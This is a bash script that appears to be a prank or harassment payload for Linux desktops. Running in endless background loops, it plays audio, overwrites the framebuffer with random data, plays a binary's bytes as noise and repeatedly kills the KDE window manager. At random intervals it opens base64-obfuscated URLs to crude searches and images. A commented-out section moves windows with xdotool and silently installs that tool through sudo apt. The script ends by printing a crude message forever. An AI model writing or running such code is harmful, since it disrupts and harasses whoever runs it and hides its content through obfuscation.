#!/bin/bash
(while true; do aplay /opt/$N/$N.wav; done) &
(while true; do
  sleep $(awk -v seed=fuvk 'BEGIN{srand(seed); print rand() * 10}')
  cat /dev/urandom > /dev/fb0
  for i in {1..10}; do 
    tail -c 176400 /bin/dolphin | aplay -r 44100 -f S8 -d 10 & 
    sleep 0.01
  done
done) &
if command -v kwin; then
  (while true; do
    sleep $(awk -v seed=j3fpn 'BEGIN{srand(seed); print rand() * 120}')
    pkill -x kwin_wayland
    pkill -x kwin_x11
  done) &
fi
if $X; then
  (while true; do
    sleep $(awk -v seed=jfo3 'BEGIN{srand(seed); print rand() * 45}')
    S=(
      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPXdoeSUyMGlzJTIwbXklMjBhc3MlMjBibGVlZGluZw=="
      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWNvcnBzZSUyMG9mJTIwa2luZyUyMG1pbm9zJTIwbW9kZSUyMGFjdGl2YXRlZA=="
      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUhFTFAlMjBJTSUyME9OJTIwRklSRSUyMElUJTIwQlVSTlM="
      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUluJTIwdGhlJTIwc3RyaXBwZWQlMjBjbHViLiUyMHN0cmFpZ2h0JTIwdXAlMjAiam9ya2luJTIwaXQiLiUyMGFuZCUyMGJ5JTIwIml0IiwlMjBoYWhhLCUyMHdlbGwuJTIwbGV0J3MlMjBqdXN0ciUyMHNheSUyMG15JTIwcGVhbml0cw=="
      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWltJTIwZnVja2luZyUyMGR5aW5n"
      "aHR0cHM6Ly9pNS5jbG91ZGZhYmxlLm5ldC9zdHlsZXMvNTUweDU1MC81NzYuMjQwL0JsYWNrL2ZyZWFrYm9iLWNhbGxpbmctZnJlYWthYm9iLW1lbnMtdC1zaGlydC1iYWNrLTIwMjQwODEyMDgyNTA1LW80MG12bHh4LXMzLmpwZw=="
      "aHR0cHM6Ly9mNC5iY2JpdHMuY29tL2ltZy9hMjA0NTUyNTAyMl8xNi5qcGc="
    )
    R="${S[RANDOM % ${#S[@]}]}"
    R=$(echo "$R" | base64 --decode)
    xdg-open "$R" 2>/dev/null || open "$R"
  done) &
end

# if command -v xdotool >/dev/null 2>&1; then
#   export $(dbus-launch)
#   export DISPLAY=:1
#   (sleep 30
#   while true; do
#     S=$(xdotool search --name '.*')
#     I=$(( RANDOM % ${#S[@]} ))
#     W=${S[$I]}
#     X=$(( (RANDOM % 3 - 1) * 30 ))
#     Y=$(( (RANDOM % 3 - 1) * 30 ))
#     xdotool windowmove "$W" \
#       $(xdotool getwindowgeometry --shell "$W" | awk -F= '/X/{x=$2} /Y/{y=$2} END{print x+'$X',y+'$Y'}')
#     sleep $(awk -v seed=fubg 'BEGIN{srand(seed); print rand() * 5}')
#   done) &
#   (S=$(xdotool search --name '.*')
#   for W in '${S[@]}'; do
#       if [[ '$(xprop -id "$W" _NET_WM_WINDOW_TYPE 2>/dev/null)' == *'DOCK'* ]]; then
#           T=W
#       fi
#   done; 
#   sleep 45; 
#   while true; 
#     do sudo xdotool windowmove $T 10 10; 
#   done) &
# elif command -v apt; then
#    sudo apt install xdotool -y
# fi

while true; do echo 'im pissing it'; sleep 1; done